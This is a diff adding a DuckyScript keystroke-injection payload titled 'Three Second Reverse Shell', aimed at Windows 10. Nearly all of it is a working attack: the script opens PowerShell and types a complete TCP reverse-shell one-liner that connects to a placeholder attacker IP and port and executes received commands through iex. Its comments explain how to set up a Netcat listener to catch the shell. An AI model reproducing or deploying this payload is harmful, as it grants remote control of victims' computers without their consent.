@@ -1,0 +1,13 @@
+REM Title: Three Second Reverse Shell
+REM Author: Inspired by Nishang's Invoke-PowerShellTcpOneLine
+REM Description: Opens a reverse shell to an attacker-controlled server.
+REM Usage: Update IP and PORT with your listener's details. Deploy with Netcat listening on the attacker's machine.
+REM Target: Windows 10
+
+DELAY 1000
+GUI r
+DELAY 200
+STRINGLN powershell
+DELAY 2000
+STRINGLN $client = New-Object System.Net.Sockets.TCPClient('YOUR_IP',YOUR_PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+GUI DOWNARROW
